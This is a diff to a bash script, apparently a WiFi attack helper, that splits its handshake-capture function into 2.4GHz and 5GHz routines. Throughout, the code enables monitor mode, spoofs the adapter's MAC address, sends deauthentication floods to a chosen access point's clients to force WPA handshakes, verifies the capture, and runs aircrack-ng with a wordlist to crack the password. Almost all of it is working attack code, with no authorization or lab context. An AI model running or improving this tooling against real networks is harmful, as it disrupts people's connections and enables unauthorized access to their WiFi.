@@ -176,36 +176,7 @@ clear
 }
 ########################################################################################################################################
 Capture_Handshake () {
-if [[ ${UID} = 0 ]];then
-if [[ -d $HOME/handshake ]]; then
-Handshake_Dir=$HOME/handshake
-else mkdir $HOME/handshake
-fi
-echo -e "#Select network interface to capture handshake:#"
-select NETWORK in $(ls /sys/class/net);do
-ADAPTER=$NETWORK
-read -p "Use $ADAPTER:?(y/n) " CHOICE
-case $CHOICE in
-y|Y) break ;;
-n|N) echo -e "Re-Select" ;;
-*) echo "Only (y/n) re-select interface." ;;
-esac
-done
-clear
-sudo airmon-ng start $ADAPTER
-clear
-wlan0=$(ip a | grep mon | head -1 | cut -d ":" -f 2)
-sudo ip link set $wlan0 down && sudo macchanger -A $wlan0 && sudo ip link set $wlan0 up
-clear
-read -p "Capture handshake on the 1.)2.4GHz or 2.)5GHz frequency?: " OPTION
-case $OPTION in
-1) echo "2.4GHz it is!"
-sleep 1;;
-2) echo "5GHz it is!"
-sleep 1;;
-*) echo -e " Not Valid number only 1 & 2 "
-sleep 2;;
-esac
+    2.4GHz () {
 exec xterm -e sudo airodump-ng $wlan0 &
 echo -e "Now Scanning all 2.4GHz WiFiChannels"
 echo -e "Select the channel of your target AP"
@@ -235,14 +206,108 @@ exec xterm -hold -e sudo airodump-ng -c $CH --bssid $BSSID -w $HOME/handshake/$H
 PID=$!
 sleep 6
 sudo aireplay-ng --deauth 10 -a $BSSID -e $ESSID -c $STATION $wlan0 
-sleep 30
+sleep 20
 kill $PID
 sudo airmon-ng stop $wlan0
 sudo ip link set $ADAPTER down && sudo ip link set $ADAPTER up
-echo
+clear; sleep 3
+cd $Handshake_Dir
+VERIFY=$(aircrack-ng $HAND-01.cap | grep handshake | cut -d "(" -f2 | cut -d " " -f 1)
+if [[ $VERIFY -ne 1 ]]; then
+echo -e "\e[91mHandshake was not successful!!\e[00m"
+read -p "PRESS ENTER all captured info will be deleted!"
+rm $HOME/handshake/$HAND*
+else
+echo -e "Remember you will need the $HAND.cap and $HAND.kismet.csv files for cracking!"
 echo -e "\e[92mGreat!\e[00m Handshake Captured: Press Enter.."
-read -p "Remember you will need the $HAND.cap and $HAND.kismet.csv files for cracking!"
+read -p ""
 rm -i $HOME/handshake/$HAND*
+fi
+}
+    5GHz () {
+exec xterm -e sudo airodump-ng -b a $wlan0 &
+echo -e "Now Scanning all 5GHz WiFiChannels"
+echo -e "Select the channel of your target AP"
+read -p "Xterm will exit after you select a channel: " CH
+kill $!
+clear
+echo -e "Gather info about the AP on channel $CH"
+echo -e "Close/spacebar xterm to copy info, xterm will not close!"
+echo -e "Xterm will close after Handshake Name has been inputted"
+read -p "press ENTER"
+exec xterm -hold -e airodump-ng -b a -c $CH $wlan0 &
+PID=$!
+read -p "BSSID: " BSSID
+#read -p "ESSID: " ESSID
+#read -p "STATION: " STATION
+read -p "Handshake Name: " HAND
+kill $PID
+echo -e "One last Xterm session will start.." 
+echo -e "This session is to monitor the Handshake on $BSSID." 
+echo -e "*This* terminal will deauthenticate all Clients -"   #$STATION 
+echo -e "to capture the EAPOL packets."
+echo -e "You will need the $HAND.cap and $HAND.kismet.csv files for cracking"
+echo -e "Don't close any window, Xterm session will close automatically." 
+echo 
+read -p "Press Enter"
+exec xterm -hold -e sudo airodump-ng -b a -c $CH --bssid $BSSID -w $HOME/handshake/$HAND $wlan0 &
+PID=$!
+sleep 6
+sudo aireplay-ng -D --deauth 20 -a $BSSID  $wlan0   #-e $ESSID -c $STATION
+sleep 20
+kill $PID
+sudo airmon-ng stop $wlan0
+sudo ip link set $ADAPTER down && sudo ip link set $ADAPTER up 
+clear; sleep 3
+cd $Handshake_Dir
+VERIFY=$(aircrack-ng $HAND-01.cap | grep handshake | cut -d "(" -f2 | cut -d " " -f 1)
+if [[ $VERIFY -ne 1 ]]; then
+echo -e "\e[91mHandshake was not successful!!\e[00m"
+read -p "PRESS ENTER all captured info will be deleted!"
+rm $HOME/handshake/$HAND*
+else
+echo -e "Remember you will need the $HAND.cap and $HAND.kismet.csv files for cracking!"
+echo -e "\e[92mGreat!\e[00m Handshake Captured: Press Enter.."
+read -p ""
+rm -i $HOME/handshake/$HAND*
+fi
+}
+if [[ ${UID} = 0 ]];then
+if [[ -d $HOME/handshake ]]; then
+Handshake_Dir=$HOME/handshake
+else mkdir $HOME/handshake
+fi
+echo -e "#Select network interface to capture handshake:#"
+select NETWORK in $(ls /sys/class/net);do
+ADAPTER=$NETWORK
+read -p "Use $ADAPTER:?(y/n) " CHOICE
+case $CHOICE in
+y|Y) break ;;
+n|N) echo -e "Re-Select" ;;
+*) echo "Only (y/n) re-select interface." ;;
+esac
+done
+clear
+sudo airmon-ng start $ADAPTER
+clear
+wlan0=$(ip a | grep mon | head -1 | cut -d ":" -f 2)
+sudo ip link set $wlan0 down && sudo macchanger -A $wlan0 && sudo ip link set $wlan0 up
+clear
+while true; do
+echo -e "Capture handshake on #" 
+read -p "1.)2.4GHz or 2.)5GHz frequency?(q=quit): " OPTION
+case $OPTION in
+1) echo "2.4GHz it is!"
+2.4GHz;break;;
+2) echo "5GHz it is!"
+5GHz;break;;
+q|Q) sudo airmon-ng stop $wlan0
+sudo ip link set $ADAPTER down && sudo ip link set $ADAPTER up
+break;;
+*) echo -e " Not Valid only 1 & 2 "
+sleep 2;clear;;
+esac
+done
 else
 echo -e "\e[91mOnly root/sudo can run this Fuction!\e[00m"
 sleep 3
@@ -260,7 +325,7 @@ BSSID=$(cat $KISMET | awk -F "," '{ print $1 }' | cut -d ";" -f 4 | tail -1)
 ESSID=$(cat $KISMET | awk -F "," '{ print $1 }' | cut -d ";" -f 3 | tail -1)
 exec xterm -hold -e aircrack-ng -e $ESSID -b $BSSID -w $WORD $PACKET & 
 }
-if [[ -d /root/handshake ]] && [[ -f $(find /root/handshake/ -name "*.cap") ]];then
+if [[ -d /root/handshake ]] && [[ $(find /root/handshake/ -name "*.cap") ]];then
 cd /root/handshake
 ls
 crack
